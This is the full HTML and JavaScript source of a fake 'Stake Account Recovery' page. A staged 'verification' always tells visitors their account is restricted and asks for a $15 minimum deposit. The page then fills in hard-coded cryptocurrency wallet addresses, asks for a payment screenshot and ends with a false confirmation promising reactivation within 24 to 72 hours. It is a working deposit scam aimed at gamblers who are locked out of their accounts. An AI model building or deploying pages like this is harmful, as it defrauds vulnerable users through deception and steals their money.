<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Stake Account Recovery</title>
  <style>
    body {
      background-color: #0f0f0f;
      color: #ffffff;
      font-family: Arial, sans-serif;
      padding: 20px;
    }
    .container {
      max-width: 500px;
      margin: auto;
      background: #1a1a1a;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
    }
    input, select, button {
      width: 100%;
      margin: 10px 0;
      padding: 10px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
    }
    button {
      background-color: #4caf50;
      color: white;
      cursor: pointer;
    }
    button:disabled {
      background-color: #888;
      cursor: not-allowed;
    }
    .address-container {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    #popup {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.8);
      justify-content: center;
      align-items: center;
    }
    #popup-message {
      background: #1a1a1a;
      padding: 20px;
      border-radius: 10px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Account Recovery</h2>

    <label>Username</label>
    <input type="text" id="username" placeholder="Enter your Stake username" />
    <button id="verifyBtn">Verify</button>
    <p id="verifyMsg" style="display:none; color:lightgreen;"></p>

    <label>Coin</label>
    <select id="coin">
      <option value="">Select Coin</option>
      <option value="USDT">USDT</option>
      <option value="BTC">BTC</option>
      <option value="TRX">TRX</option>
      <option value="Ethereum">Ethereum</option>
    </select>

    <label>Network</label>
    <select id="network">
      <option value="">Select Network</option>
      <option value="TRC20">TRC20</option>
      <option value="BSC">BSC</option>
    </select>

    <label>Wallet Address</label>
    <div class="address-container">
      <input type="text" id="address" readonly />
      <button onclick="copyAddress()">Copy</button>
    </div>

    <label>Amount ($)</label>
    <input type="number" id="amount" placeholder="Enter deposit amount" />

    <label>Upload Screenshot</label>
    <input type="file" id="screenshot" accept="image/*" />

    <button id="submitBtn" disabled>Submit</button>
  </div>

  <div id="popup">
    <div id="popup-message">
      <p>Your account recovery request has been received by Stake Pass. Your Stake account will be fully active within 24 - 72 hours.</p>
      <button onclick="closePopup()">OK</button>
    </div>
  </div>

  <script>
    const addressMap = {
      "USDT-TRC20": "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
      "USDT-BSC": "0x4d31c46627c343939e7a02383c2451048a509a0c",
      "BTC-BSC": "0x4d31c46627c343939e7a02383c2451048a509a0c",
      "TRX-TRC20": "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
      "TRX-BSC": "0x4d31c46627c343939e7a02383c2451048a509a0c",
      "Ethereum-BSC": "0x4d31c46627c343939e7a02383c2451048a509a0c"
    };

    document.getElementById("verifyBtn").onclick = () => {
      document.getElementById("verifyMsg").style.display = "block";
      document.getElementById("verifyMsg").innerText = "Verifying...";
      setTimeout(() => {
        document.getElementById("verifyMsg").innerText =
          "Your Stake account is in withdraw-only mode or has restrictions. To resolve this, a minimum deposit of $15 is required. The deposited amount will be added to your Stake account automatically.";
        checkFormCompletion();
      }, 1000);
    };

    document.getElementById("coin").onchange = updateAddress;
    document.getElementById("network").onchange = updateAddress;

    function updateAddress() {
      const coin = document.getElementById("coin").value;
      const network = document.getElementById("network").value;
      const key = `${coin}-${network}`;
      document.getElementById("address").value = addressMap[key] || "";
      checkFormCompletion();
    }

    function copyAddress() {
      const address = document.getElementById("address");
      address.select();
      address.setSelectionRange(0, 99999);
      document.execCommand("copy");
    }

    function checkFormCompletion() {
      const username = document.getElementById("username").value.trim();
      const verified = document.getElementById("verifyMsg").innerText.includes("Stake account is in withdraw-only");
      const coin = document.getElementById("coin").value;
      const network = document.getElementById("network").value;
      const address = document.getElementById("address").value;
      const amount = document.getElementById("amount").value;
      const screenshot = document.getElementById("screenshot").files.length;
      const isValid = username && verified && coin && network && address && amount && screenshot;
      document.getElementById("submitBtn").disabled = !isValid;
    }

    document.querySelectorAll("input, select").forEach(el => {
      el.oninput = el.onchange = checkFormCompletion;
    });

    document.getElementById("submitBtn").onclick = () => {
      document.getElementById("popup").style.display = "flex";
    };

    function closePopup() {
      document.getElementById("popup").style.display = "none";
      location.reload();
    }
  </script>
</body>
</html>
